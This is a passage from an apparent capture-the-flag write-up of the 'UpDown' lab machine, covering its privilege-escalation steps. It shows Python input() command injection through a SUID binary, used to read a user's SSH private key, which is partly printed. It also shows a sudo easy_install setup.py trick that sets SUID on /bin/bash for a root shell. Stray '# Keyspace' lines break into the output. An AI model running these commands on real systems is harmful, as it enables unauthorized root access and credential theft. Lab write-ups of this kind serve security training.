</span></span><span style="display:flex;"><span>sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>developer:x:1002:1002::/home/developer:/bin/bash
</span></span></code></pre></div><h2 id="privesc-developer">Privesc [Developer]</h2>
<p>In <code>/home/developer/dev</code> directory, there are two file named <code>siteisup</code> and <code>siteisup_test.py</code>. This <code>siteisup</code> hs SUID bit bind to it. So we could be able to run it as the owner of that file which is <code>developer</code> user. When we view the strings of the <code>siteisup</code> binary, we can see that it is calling the <code>siteisup_test.py</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Keyspace</span>
</span></span><span style="display:flex;"><span>_ITM_deregisterTMCloneTable
</span></span><span style="display:flex;"><span>__gmon_start__
</span></span><span style="display:flex;"><span>_ITM_registerTMCloneTable
</span></span><span style="display:flex;"><span>u+UH
</span></span><span style="display:flex;"><span><span style="color:#f92672">[]</span>A<span style="color:#ae81ff">\A</span><span style="color:#f92672">]</span>A^A_
</span></span><span style="display:flex;"><span>Welcome to <span style="color:#e6db74">&#39;siteisup.htb&#39;</span> application
</span></span><span style="display:flex;"><span>/usr/bin/python /home/developer/dev/siteisup_test.py
</span></span><span style="display:flex;"><span>:*3$<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">crtstuff.c
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">deregister_tm_clones
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__do_global_dtors_aux
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Keyspace
</span></span></span></code></pre></div><p>Let&rsquo;s look at the <code>siteisup_test.py</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter URL here:&#34;</span>)
</span></span><span style="display:flex;"><span>page <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> page<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Website is up&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Website is down&#34;</span>
</span></span></code></pre></div><p>This is a simple python script. But the interesting part is if we found a script like this which contains <code>input()</code> function like that, we can abuse that to run system command.</p>
<p>Normally we can run system commands using python like this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cat /etc/passwd&#34;</span>)
</span></span></code></pre></div><p>But we can make it a oneliner and give it to the <code>input()</code> as the user input and python will execute the system command like this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;cat /etc/passwd&#39;</span>)
</span></span></code></pre></div><p>So with this, let&rsquo;s try to read the <code>id_rsa</code> of the <code>developer</code> user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@updown:/home/developer/dev$ ./siteisup
</span></span><span style="display:flex;"><span>Welcome to <span style="color:#e6db74">&#39;siteisup.htb&#39;</span> application
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enter URL here:__import__<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;os&#39;</span><span style="color:#f92672">)</span>.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /home/developer/.ssh/id_rsa&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
</span></span><span style="display:flex;"><span>S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
</span></span><span style="display:flex;"><span>                              <span style="color:#75715e"># Keyspace</span>
</span></span><span style="display:flex;"><span>ZSESqGN9EfOnUqvQa317rHnO3moDWTnYDbynVJuiQHlDaSCyf+uaZoCMINSG5IOC/4Sj0v
</span></span><span style="display:flex;"><span>3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWe
</span></span><span style="display:flex;"><span>N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>Now we can login as the <code>developer</code> user and capture the user flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>developer@updown:~$ whoami
</span></span><span style="display:flex;"><span>developer
</span></span><span style="display:flex;"><span>developer@updown:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>developer@updown:~$ cat user.txt
</span></span><span style="display:flex;"><span>e3b**************************a26
</span></span></code></pre></div><h2 id="privesc-root">Privesc [Root]</h2>
<p>User <code>developer</code> can run <code>/usr/local/bin/easy_install</code> as the <code>root</code> user with no password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>developer@updown:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> developer on localhost:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User developer may run the following commands on localhost:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/local/bin/easy_install
</span></span></code></pre></div><p>If we look into <a href="https://gtfobins.github.io/">GTFOBins</a> for <a href="https://gtfobins.github.io/gtfobins/easy_install/#sudo">easy_install</a> to find PE vector, we can find there is a way we can get a <code>root</code> shell by using <code>easy_install</code>.</p>
<p>So let&rsquo;s get a <code>root</code> shell and capture the root flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>developer@updown:~$ echo <span style="color:#e6db74">&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;chmod u+s /bin/bash&#39;)&#34;</span> &gt; setup.py
</span></span><span style="display:flex;"><span>developer@updown:~$ sudo easy_install .
</span></span><span style="display:flex;"><span>WARNING: The easy_install command is deprecated and will be removed in a future version.
</span></span><span style="display:flex;"><span>Processing .
</span></span><span style="display:flex;"><span>Writing /home/developer/setup.cfg
</span></span><span style="display:flex;"><span>Running setup.py -q bdist_egg --dist-dir /home/developer/egg-dist-tmp-tQthF_
</span></span><span style="display:flex;"><span>developer@updown:~$ ls -la /bin/bash
</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1183448</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> /bin/bash
</span></span><span style="display:flex;"><span>developer@updown:~$ bash -p
</span></span><span style="display:flex;"><span>bash-5.0# whoami
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span>bash-5.0# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>bash-5.0# cat /root/root.txt
</span></span><span style="display:flex;"><span>880**************************86f
</span></span></code></pre></div>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
